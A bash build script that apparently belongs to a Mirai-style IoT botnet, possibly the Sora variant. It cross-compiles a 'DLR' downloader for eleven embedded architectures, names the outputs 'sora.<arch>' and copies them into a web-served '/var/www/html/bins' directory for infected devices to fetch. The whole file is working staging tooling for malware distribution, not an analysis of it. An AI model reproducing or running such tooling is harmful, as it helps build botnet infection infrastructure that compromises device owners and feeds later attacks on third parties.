#!/bin/bash

# DLR (Downloader) Cross-Compilation Script
# Builds DLRs for multiple architectures and copies to /var/www/html/bins

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
DLR_SOURCE_DIR="/root/dlr"
OUTPUT_DIR="/root/dlr/release"
WEB_DIR="/var/www/html/bins"
CROSS_COMPILER_DIR="/etc/xcompiler"

echo -e "${BLUE}=== DLR Cross-Compilation Script ===${NC}"
echo -e "${YELLOW}Source Directory: $DLR_SOURCE_DIR${NC}"
echo -e "${YELLOW}Output Directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}Web Directory: $WEB_DIR${NC}"
echo -e "${YELLOW}Cross-Compiler Directory: $CROSS_COMPILER_DIR${NC}"

# Create directories
mkdir -p "$OUTPUT_DIR"
mkdir -p "$WEB_DIR"

# Architecture configurations
declare -A ARCHITECTURES=(
    ["i586"]="i586-gcc"
    ["mips"]="mips-gcc"
    ["mipsel"]="mipsel-gcc"
    ["armv4l"]="armv4l-gcc"
    ["armv5l"]="armv5l-gcc"
    ["armv6l"]="armv6l-gcc"
    ["armv7l"]="armv7l-gcc"
    ["m68k"]="m68k-gcc"
    ["powerpc"]="powerpc-gcc"
    ["sh4"]="sh4-gcc"
    ["sparc"]="sparc-gcc"
)

# Common flags
COMMON_FLAGS="-static -Os -std=c99 -D_GNU_SOURCE"

# Function to compile DLR for specific architecture
compile_dlr() {
    local arch=$1
    local compiler=$2
    local output_name="sora.$arch"
    
    echo -e "${BLUE}=== Compiling DLR for $arch ===${NC}"
    echo -e "${YELLOW}Using compiler: $CROSS_COMPILER_DIR/$arch/bin/$compiler${NC}"
    echo -e "${YELLOW}Flags: $COMMON_FLAGS${NC}"
    
    cd "$DLR_SOURCE_DIR"
    
    # Compile with error handling
    if ! $CROSS_COMPILER_DIR/$arch/bin/$compiler $COMMON_FLAGS -o "$OUTPUT_DIR/$output_name" main.c 2>&1; then
        echo -e "${RED}Compilation failed for $arch${NC}"
        return 1
    fi
    
    # Strip the binary
    if command -v "$CROSS_COMPILER_DIR/$arch/bin/$arch-strip" >/dev/null 2>&1; then
        "$CROSS_COMPILER_DIR/$arch/bin/$arch-strip" "$OUTPUT_DIR/$output_name"
    fi
    
    echo -e "${GREEN}Successfully compiled $arch -> $output_name${NC}"
    return 0
}

# Function to copy binaries to web directory
copy_to_web() {
    local arch=$1
    local output_name="sora.$arch"
    
    if [ -f "$OUTPUT_DIR/$output_name" ]; then
        cp "$OUTPUT_DIR/$output_name" "$WEB_DIR/"
        echo -e "${GREEN}Copied $output_name to $WEB_DIR${NC}"
    else
        echo -e "${RED}Binary $output_name not found${NC}"
        return 1
    fi
}

echo -e "${BLUE}Starting DLR compilation process...${NC}"

# Compile for all architectures
success_count=0
total_count=0

for arch in "${!ARCHITECTURES[@]}"; do
    total_count=$((total_count + 1))
    if compile_dlr "$arch" "${ARCHITECTURES[$arch]}"; then
        success_count=$((success_count + 1))
        copy_to_web "$arch"
    fi
done

echo -e "${BLUE}=== Compilation Summary ===${NC}"
echo -e "${YELLOW}Output directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}Web directory: $WEB_DIR${NC}"
echo -e "${YELLOW}Compiled DLRs:${NC}"

# List compiled binaries
ls -la "$OUTPUT_DIR"/sora.* 2>/dev/null || echo "No DLR binaries found"
ls -la "$WEB_DIR"/sora.* 2>/dev/null || echo "No DLR binaries in web directory"

echo -e "${YELLOW}Successfully compiled: $success_count/$total_count architectures${NC}"

if [ $success_count -eq $total_count ]; then
    echo -e "${GREEN}All DLRs compiled successfully!${NC}"
else
    echo -e "${YELLOW}Some DLRs failed to compile${NC}"
fi

echo -e "${BLUE}=== Usage Instructions ===${NC}"
echo -e "${YELLOW}1. DLR binaries are in: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}2. Web-accessible DLRs are in: $WEB_DIR${NC}"
echo -e "${YELLOW}3. Each DLR is named: sora.<architecture>${NC}"
echo -e "${YELLOW}4. Use the appropriate DLR for the target architecture${NC}"

echo -e "${GREEN}DLR compilation process completed!${NC}"
